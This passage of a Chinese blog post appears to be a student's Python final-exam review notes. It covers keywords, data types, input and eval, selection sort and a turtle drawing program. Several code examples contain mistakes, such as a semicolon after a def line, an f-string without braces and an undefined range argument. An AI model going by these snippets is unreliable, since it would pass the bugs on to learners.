class="number">.1</span>f&#125;</span>cm ~ <span class="subst">&#123;boy_max:<span class="number">.1</span>f&#125;</span>cm）&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;女孩：<span class="subst">&#123;girl_height:<span class="number">.1</span>f&#125;</span>cm（范围：<span class="subst">&#123;girl_min:<span class="number">.1</span>f&#125;</span>cm ~ <span class="subst">&#123;girl_max:<span class="number">.1</span>f&#125;</span>cm）&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Python语法元素分析"><a href="#Python语法元素分析" class="headerlink" title="Python语法元素分析"></a>Python语法元素分析</h2><h3 id="程序的格式框架"><a href="#程序的格式框架" class="headerlink" title="程序的格式框架"></a>程序的格式框架</h3><p>（1）缩进</p>
<p>Python语言采用严格的“缩进”来表明程序的格式框架。缩进指每一行代码开始前的空白区域，用来表示代码之间的包含和层次关系。</p>
<p>1个缩进 &#x3D; 4个空格。用以在Python中标明代码的层次关系，缩进是Python语言中表明程序框架的唯一手段。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image.png" alt="image.png"></p>
<p>单层缩进</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%201.png" alt="image.png"></p>
<p>多层缩进</p>
<p>（2）注释</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%202.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%203.png" alt="image.png"></p>
<h3 id="命名与保留字"><a href="#命名与保留字" class="headerlink" title="命名与保留字"></a>命名与保留字</h3><p>（1）Python 3.x保留字列表 (33个)</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%204.png" alt="image.png"></p>
<p>（2）命名表示</p>
<p><strong>逻辑与值</strong></p>
<p>1.True&#x2F;False：布尔值常量，表示逻辑真&#x2F;假</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#True和False与整数进行比较</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">True</span>==<span class="number">1</span>)<span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span>==<span class="number">0</span>)<span class="comment">#True</span></span><br><span class="line"><span class="comment">#True和False与浮点数进行比较</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">True</span>==<span class="number">1.0</span>)<span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span>==<span class="number">0.0</span>)<span class="comment">#True</span></span><br><span class="line"><span class="comment">#True和False与字符串进行比较</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">True</span>==<span class="string">&quot;True&quot;</span>)<span class="comment">#False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span>==<span class="string">&quot;false&quot;</span>)<span class="comment">#False</span></span><br></pre></td></tr></table></figure>

<p>2.None：空值常量，表示无数据，其数据类型为NoneType；所有赋值为None的变量都相等，并且None与其他任何非None的对象比较的结果都为False。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No data&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>3.and&#x2F;or&#x2F;not：逻辑与&#x2F;或&#x2F;非运算，优先级not&gt;and&gt;or</p>
<p>and：所有条件必须同时为真，整个表达式才为真</p>
<p>or：只要有一个条件为真(True)，整个表达式为真</p>
<p>not：逻辑非运算，对布尔值取反</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> lst <span class="keyword">or</span> <span class="built_in">len</span>(lst)&gt;<span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;条件成立&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> lst <span class="keyword">and</span> <span class="built_in">len</span>(lst)&lt;<span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;有效列表&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">### 实际应用场景:用户权限验证</span></span><br><span class="line">is_admin = <span class="literal">False</span></span><br><span class="line">is_vip = <span class="literal">True</span></span><br><span class="line">has_2fa = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 允许访问的条件:管理员或(VIP且开启了二次验证)</span></span><br><span class="line">access_granted = is_admin <span class="keyword">or</span> (is_vip <span class="keyword">and</span> has_2fa)</span><br><span class="line"><span class="comment"># 使用not优化逻辑:非管理员且验证不通过时拒绝</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_admin <span class="keyword">and</span> <span class="keyword">not</span>(is_vip <span class="keyword">and</span> has_2fa):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;访问被拒绝&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;允许访问&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>控制流</strong></p>
<p>4.if&#x2F;elif&#x2F;else：条件分支控制</p>
<p>if：判断语句</p>
<p>elif：判断语句，else if的缩写，是if语句的一部分，用于在满足多个条件时执行不同的代码块。</p>
<p>else：判断语句，对应if语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">score = <span class="number">85</span></span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;A&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">80</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;B&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>5.for&#x2F;in：遍历可迭代对象</p>
<p>for：循环语句</p>
<p>in：成员运算符，用于判断某个元素是否存在于一个集合中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]:</span><br><span class="line">    <span class="built_in">print</span>(num)<span class="comment">#输出123</span></span><br><span class="line"></span><br><span class="line">my_list =[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">3</span> <span class="keyword">in</span> my_list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3存在于my_list中&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3不存在于my_list中&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>6.while&#x2F;break&#x2F;continue：循环控制与中断</p>
<p>while：循环语句，后接条件，若条件为真则运行后面的代码块break:用来终止循环语句，即循环条件没有False条件或者序列还没被完全递归完，也会停止执行循环语句。</p>
<p>continue：跳出本次循环，在本次循环后面的语句则不执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用while循环从1数到10</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> count &lt;= <span class="number">10</span>:</span><br><span class="line"><span class="comment">#当count等于5时，使用continue跳过本次循环的剩余代码，直接进入下一次循环</span></span><br><span class="line">    <span class="keyword">if</span> count==<span class="number">5</span>:</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line"><span class="comment">#当count等于8时，使用break跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> count==<span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    count+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>函数与类</strong></p>
<p>7.def：定义函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;hello,(name)!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(greet(<span class="string">&quot;Alice&quot;</span>)) <span class="comment">#输出 Hello,Alice!</span></span><br></pre></td></tr></table></figure>

<p>8.return：从函数返回值，并总结程序运行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>);</span><br><span class="line">    result=a+b</span><br><span class="line">    <span class="keyword">return</span> result <span class="comment">#返回计算结果</span></span><br></pre></td></tr></table></figure>

<p>9.lambda：创建匿名函数，它可以在不使用def和return关键字的情况下创建简单的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">square=<span class="keyword">lambda</span> x:x**<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(square(<span class="number">3</span>)) <span class="comment">#输出9</span></span><br></pre></td></tr></table></figure>

<p>10.class：用于定义类，是对象的声明</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bark</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Woof!&quot;</span>)</span><br><span class="line">my_dog=Dog()</span><br><span class="line">my_dog.bark()</span><br></pre></td></tr></table></figure>

<p><strong>全局变量</strong></p>
<p>11.global：用于在函数内部声明一个全局变量，使其能够被函数内部修改。</p>
<p>x仅在函数内被修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_x</span>():</span><br><span class="line">    x=<span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">modify_x()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>

<p>x作为全局变量被修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_x</span>():</span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    x=<span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">modify_x()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>

<p>12.nonlocal：用于在嵌套函数中声明一个外层变量(但非全局变量)，使得内部函数可以调用该变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    x=<span class="number">10</span> <span class="comment">#外部函数的局部变量</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        x=<span class="number">20</span> <span class="comment">#修改外部函数的x</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;内部函数 x=&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;外部函数 x=&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">outer()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    x=<span class="number">10</span> <span class="comment">#外部函数的局部变量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> x</span><br><span class="line">        x=<span class="number">20</span> <span class="comment">#修改外部函数的x</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;内部函数 x=&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;外部函数 x=&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">outer()</span><br></pre></td></tr></table></figure>

<p><strong>导入&amp;命名</strong></p>
<p><strong>13.import&#x2F;from&#x2F;as：</strong>模块导入与命名</p>
<p>import：用于导入Python 模块或包，让当前脚本可以使用其他模块的功能。</p>
<p>from：用于从模块中导入特定的函数、类或变量，避免导入整个模块。</p>
<p>as：用于简化代码、避免名称冲突或提高可读性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#从math库中导入sqrt函数</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt <span class="keyword">as</span> sq</span><br><span class="line"><span class="built_in">print</span>(sq(<span class="number">25</span>))</span><br><span class="line"><span class="comment">#输出:5</span></span><br></pre></td></tr></table></figure>

<p><strong>删除&amp;通过</strong></p>
<p>14.del：用于删除变量、列表元素、对象属性等，释放内存。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="number">10</span></span><br><span class="line"><span class="keyword">del</span> x <span class="comment">#删除变量#</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：NameError:name &#x27;s&#x27; is not defined</span></span><br></pre></td></tr></table></figure>

<ol start="15">
<li>pass：占位符，用于语法上需要代码但实际不执行任何操作。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pass占位：避免语法错误</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><strong>异常处理</strong></p>
<p>16.try&#x2F;except&#x2F;finally&#x2F;raise：异常处理语句，用于处理代码运行时可能发生的错误和异常，避免程序崩溃。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入一个整数:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;不允许输入负数&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入的数字是:&quot;</span>,num)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异常:&quot;</span>,e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line">输入一个整数:-<span class="number">5</span></span><br><span class="line">异常:不允许输入负数程序结束</span><br></pre></td></tr></table></figure>

<p><strong>断言</strong></p>
<p>17.assert：用于检查某个条件是否为 True，如果条件为 False则触发AssertionError并可选地附带错误信息，通常用于调试。</p>
<p>assert用于判断除数不能为0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">assert</span> b!=<span class="number">0</span>,<span class="string">&quot;除数不能为 0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> a/b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>,<span class="number">2</span>)) <span class="comment">#正常运行</span></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>,<span class="number">0</span>)) <span class="comment">#触发AssertionError</span></span><br></pre></td></tr></table></figure>

<p><strong>生成器</strong></p>
<p>18.yield：使函数变成迭代器，每次调用 yield 都会返回一个值,但函数的执行状态会被保存，可在下次迭代时继续执行。</p>
<p>每次调用next，函数都会暂停在yield并返回值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><strong>判断&amp;处理</strong></p>
<p>19.is用于判断两个对象是否是同一个对象，而不是判断它们的值是否相等。</p>
<p>20.with：用于上下文管理，通常用于简化资源管理，确保资源使用后能正确释放。</p>
<p>判断两者存储地址是否相同</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(a == b)<span class="comment">#判断数值相等</span></span><br><span class="line"><span class="built_in">print</span>(a <span class="keyword">is</span> b)<span class="comment">#判断是否同一对象</span></span><br></pre></td></tr></table></figure>

<p>用with打开并写入文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;Hello, world!&quot;</span>)</span><br><span class="line"><span class="comment">#文件自动关闭</span></span><br></pre></td></tr></table></figure>

<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>（1）程序设计语言让计算机明确数据形式的方式，为数据类型100,100,100</p>
<p>（2）<strong>数值：Python语言中，包含整型、浮点型、复数类型等三种，</strong>100，30.7，1+2i，int（），float（）转换</p>
<p>Python中一般可以直接操作数值运算，不用担心溢出问题，但需要注意0.1 + 0.2 &#x3D; ?</p>
<p>数值过长时，可以用下划线“_”分割。i &#x3D; 1_000_000,   i + 10 &#x3D; ?</p>
<p>（3）<strong>字符串：</strong>Python语言中，<strong>字符串是用两个双引号“ ”或者单引号‘ ’括起来的一个或多个字符。</strong>Python字符串的两种序号体系。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%205.png" alt="image.png"></p>
<p>字符串中取字符：TempStr[-1]：<strong>取字符串TempStr最后一个字符</strong></p>
<p>字符串区间访问：TempStr[0:-1]：<strong>取开始到最后一个字符（不含）的部分</strong></p>
<p>*<strong>左闭右开</strong></p>
<p>（4）序列：在Python中，<strong>序列指任何包含对象的有序集合。可以通过“索引” 来获取其中的成员，也可以通过“切片” 来获取其中的子序列。</strong></p>
<p>列表，字符串，元组，数组（Numpy库）</p>
<p>Len(), string[index]，string.index(x)，string[0:2]</p>
<p>String[0:10:1]</p>
<p>（5）布尔类型</p>
<p>a.Python中表示“真”、“假”的类型，<strong>True和False，对应0、1。int(True)，int(False)</strong></p>
<p>b.<strong>布尔值可作为数值参与运算</strong></p>
<p>练习：从网上随意找一段文字，并统计字符串中有多少个特定字符？例如，空格，“人”、“标点符号”</p>
<h3 id="语句与函数、Python的输入输出"><a href="#语句与函数、Python的输入输出" class="headerlink" title="语句与函数、Python的输入输出"></a>语句与函数、<strong>Python的输入输出</strong></h3><p>（1）赋值语句</p>
<p>a.Python语言中，&#x3D; 表示“赋值”，即将等号右侧的值计算后将结果值赋给左侧变量，包含等号（&#x3D;）的语句称为“赋值语句”</p>
<p>b.同步赋值语句：同时给多个变量赋值&lt;变量1&gt;, …, &lt;变量N&gt; &#x3D; &lt;表达式1&gt;, …, &lt;表达式N&gt;</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%206.png" alt="image.png"></p>
<p><strong>（2）input()函数</strong></p>
<p>获得用户输入之前，input()函数可以包含一些提示性文字</p>
<p><strong>&lt;变量&gt; &#x3D; input(&lt;提示性文字&gt;)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">input</span>(<span class="string">&quot;请输入: &quot;</span>)</span><br><span class="line">请输入: python</span><br><span class="line"><span class="string">&#x27;python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">input</span>(<span class="string">&quot;请输入: &quot;</span>)</span><br><span class="line">请输入: <span class="number">1024.256</span></span><br><span class="line"><span class="string">&#x27;1024.256&#x27;</span></span><br></pre></td></tr></table></figure>

<p>（3）分支语句</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%207.png" alt="image.png"></p>
<p><strong>（4）eval()函数</strong></p>
<p>eval(&lt;字符串&gt;)函数是Python语言中一个十分重要的函数，它能够以Python表达式的方式解析并执行字符串，将返回结果输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;x = <span class="number">1</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">eval</span>(<span class="string">&quot;x + 1&quot;</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">eval</span>(<span class="string">&quot;1.1 + 2.2&quot;</span>)</span><br><span class="line"><span class="number">3.3</span></span><br></pre></td></tr></table></figure>

<p><strong>（5）输出函数</strong></p>
<p>print()函数用来输出字符信息，或以字符形式输出变量。</p>
<p>print()函数可以输出各种类型变量的值。</p>
<p>print()输出多个变量或常量，用逗号分隔</p>
<p>例如：print(“a和b的值为:”，a , b)</p>
<p>（6）格式化输出</p>
<p>在输出变量的值时，<strong>可以通过字符串的format方法将输出变量整理成我们期望的格式</strong></p>
<p>大括号表示槽的位置，括号内容由format方法的参数C填充</p>
<p><strong>大括号中的：.2f表示输出格式（保留两位小数）</strong></p>
<p><strong>（6）循环语句</strong></p>
<p>a.循环语句：控制程序运行，根据判断条件或计数条件确定一段程序的运行次数</p>
<p>b.遍历循环，基本过程如下</p>
<p>for i in range (&lt;计数值&gt;):</p>
<p>&lt;语句块&gt;</p>
<p>c.例如，使某一段程序连续运行10次</p>
<p>for i in range (10)：</p>
<p>&lt;语句块&gt;</p>
<p>d.其中，变量i用于计数</p>
<p>*练习：基于本节课学习内容，撰写一个“选择排序”程序</p>
<p><strong>第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">selection_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="comment"># 遍历数组中的所有元素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        <span class="comment"># 假设当前元素是最小的</span></span><br><span class="line">        min_idx = i</span><br><span class="line">        <span class="comment"># 检查剩余未排序部分是否有更小的元素</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[j] &lt; arr[min_idx]:</span><br><span class="line">                min_idx = j</span><br><span class="line">        <span class="comment"># 将找到的最小元素与当前位置元素交换</span></span><br><span class="line">        arr[i], arr[min_idx] = arr[min_idx], arr[i]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试选择排序</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_array = [<span class="number">64</span>, <span class="number">25</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">11</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;排序前:&quot;</span>, test_array)</span><br><span class="line">    sorted_array = selection_sort(test_array)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;排序后:&quot;</span>, sorted_array)</span><br></pre></td></tr></table></figure>

<h2 id="turtle库和蟒蛇绘制程序"><a href="#turtle库和蟒蛇绘制程序" class="headerlink" title="turtle库和蟒蛇绘制程序"></a>turtle库和蟒蛇绘制程序</h2><h3 id="1-蟒蛇绘制实例"><a href="#1-蟒蛇绘制实例" class="headerlink" title="1.蟒蛇绘制实例"></a><strong>1.蟒蛇绘制实例</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e2.1DrawPython.py</span></span><br><span class="line"><span class="keyword">import</span> turtle<span class="comment">#import是一个关键字，用来引入一些外部库，这里的含义是引入一个名字叫turtle的函数库</span></span><br><span class="line">turtle.setup(<span class="number">650</span>,<span class="number">350</span>,<span class="number">200</span>,<span class="number">200</span>)<span class="comment">#前两个为画布长宽，后两个为画布距离屏幕左上角距离</span></span><br><span class="line">turtle.penup()<span class="comment">#抬起画笔</span></span><br><span class="line">turtle.fd(-<span class="number">250</span>)<span class="comment">#往前/后走250个(看符号)，penup了不留痕迹</span></span><br><span class="line">turtle.pendown()<span class="comment">#放下画笔</span></span><br><span class="line">turtle.pensize(<span class="number">25</span>)<span class="comment">#画笔大小</span></span><br><span class="line">turtle.pencolor(<span class="string">&quot;purple&quot;</span>)<span class="comment">#颜色</span></span><br><span class="line">turtle.seth(-<span class="number">40</span>)<span class="comment">#设置朝向，负为顺时针</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):<span class="comment">#循环0,1,2,3(4次，左闭右开，每次画了一正一反2个弯，共8个弯)</span></span><br><span class="line">    turtle.circle(<span class="number">40</span>,<span class="number">80</span>)<span class="comment">#第一个为圆的半径，第一个为圆的弧长(圆的度数的弧长)</span></span><br><span class="line">    turtle.circle(-<span class="number">40</span>, <span class="number">80</span>)  <span class="comment">#以它的右侧40，再画80弧长</span></span><br><span class="line">turtle.circle(<span class="number">40</span>,<span class="number">80</span>/<span class="number">2</span>)</span><br><span class="line">turtle.fd(<span class="number">40</span>)<span class="comment">#往前40距离</span></span><br><span class="line">turtle.circle(<span class="number">16</span>,<span class="number">180</span>)<span class="comment">#画了一个180度的圆</span></span><br><span class="line">turtle.fd(<span class="number">40</span>*<span class="number">2</span>/<span class="number">3</span>)<span class="comment">#往前走了此距离</span></span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure>

<h3 id="Python蟒蛇程序分析"><a href="#Python蟒蛇程序分析" class="headerlink" title="Python蟒蛇程序分析"></a>Python蟒蛇程序分析</h3><p>（1）import turtle：import是一个关键字，用来引入一些外部库，这里的含义是引入一个名字叫turtle的函数库</p>
<p>（2）Turtle库：</p>
<p>a,Turtle库是Python语言中一个很流行的绘制图像的函数库</p>
<p>b.使用turtle库，需要有以下概念：想象一个小乌龟，在一个横轴为x、纵轴为y的坐标系原点，(0,0)位置开始。它根据一组函数指令的控制，在这个平面坐标系中移动，从而在它爬行的路径上绘制了图形</p>
<p>c.<a>.<b>()是Python典型表达形式：对象.方法()、库.函数()</p>
<p>d.Turtle中的turtle.setup()函数用于启动一个图形窗口，它有四个参数：turtle.setup(width, height, startx, starty)</p>
<p>分别是：<strong>启动窗口的宽度和高度。</strong>表示窗口启动时，<strong>窗口左上角在屏幕中的坐标位置。</strong></p>
<p>（3）程序：</p>
<p>a.Turtle中的turtle.pencolor()函数表示小乌龟运动轨迹的颜色。</p>
<p>b.它包含一个输入参数，这里我们把它设为蓝色，blue，其他颜色单词也可以使用。Turtle采用RGB方式来定义颜色，如果希望获得和图片中颜色一致的小蛇，请输入turtle.pencolor(“#3B9909”)</p>
<p>c.Turtle.penup()  turtle.pendown() 表示提起和放下画笔</p>
<p>d.Turtle中的turtle.pensize()函数表示小乌龟运动轨迹的宽度。它包含一个输入参数，这里我们把它设为25像素。</p>
<p>e.Turtle中的turtle.seth(angle)函数表示小乌龟启动时运动的方向。它包含一个输入参数，是角度值。</p>
<p>其中，0表示向东，90度向北，180度向西，270度向南；负值表示相反方向。</p>
